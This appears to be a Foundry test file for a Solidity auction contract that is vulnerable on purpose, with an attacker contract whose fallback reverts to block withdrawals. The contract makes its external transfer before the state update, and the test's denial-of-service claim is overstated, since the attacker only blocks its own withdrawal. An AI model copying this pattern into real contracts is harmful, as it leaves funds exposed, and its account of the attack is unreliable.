pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract as provided
// SPDX-License-Identifier: MIT

contract BidVulnerable {
    // Highest bidder and bid (vulnerable state variables)
    address public highestBidder;
    uint public highestBid;
    
    // Records amount pending withdrawal for each address
    mapping(address => uint) public pendingReturns;

    // Vulnerable withdraw function: external call (transfer) is done before state update
    function withdraw() public {
        uint amount = pendingReturns[msg.sender];
        require(amount > 0, "No pending returns");
        
        // If the sender is not the highest bidder, transfer all funds.
        if (msg.sender != highestBidder) {
            // External call before state update; if the call reverts, the function fails
            payable(msg.sender).transfer(amount);
        } else {
            payable(msg.sender).transfer(amount - highestBid);
        }
        
        // State update after external call (vulnerability)
        pendingReturns[msg.sender] = 0;
    }

    // Fallback function to receive ETH
    receive() external payable {}
}


// The attacker contract which exploits the vulnerability
contract AttackVulnerable {
    BidVulnerable public bidContract;

    // The constructor receives the vulnerable contract's address
    constructor(address payable _bidContract) {
        bidContract = BidVulnerable(_bidContract);
    }

    // Fallback deliberately reverts to block the transfer
    receive() external payable {
        revert("Attack contract rejects funds");
    }

    // Function to trigger the vulnerable withdraw
    function attackWithdraw() public {
        bidContract.withdraw();
    }
}


// Forge test contract focusing on the DoS vulnerability
contract VulnerableTest is Test {

    // Test to demonstrate how a malicious contract can block withdrawals
    function testAttackDenialOfService() public {
        // Deploy the vulnerable contract
        BidVulnerable bid = new BidVulnerable();
        
        // Fund the vulnerable contract with enough ether to cover withdrawal
        vm.deal(address(bid), 1 ether);
        
        // Deploy the attacker contract
        AttackVulnerable attacker = new AttackVulnerable(payable(address(bid)));
        
        // Manually set pendingReturns for the attacker contract.
        // Since 'pendingReturns' is a mapping at slot 2 (after highestBidder at slot 0 and highestBid at slot 1),
        // we compute the storage slot as keccak256(abi.encode(key, uint256(2))).
        bytes32 slot = keccak256(abi.encode(uint256(uint160(address(attacker))), uint256(2)));
        vm.store(address(bid), slot, bytes32(uint256(0.1 ether)));
        
        // Expect the withdraw call to revert due to the attacker's fallback reverting.
        vm.expectRevert("Attack contract rejects funds");
        
        // Trigger the attack. The call to withdraw() via attackWithdraw() should revert,
        // demonstrating the Denial of Service vulnerability in the vulnerable contract.
        attacker.attackWithdraw();
    }
}
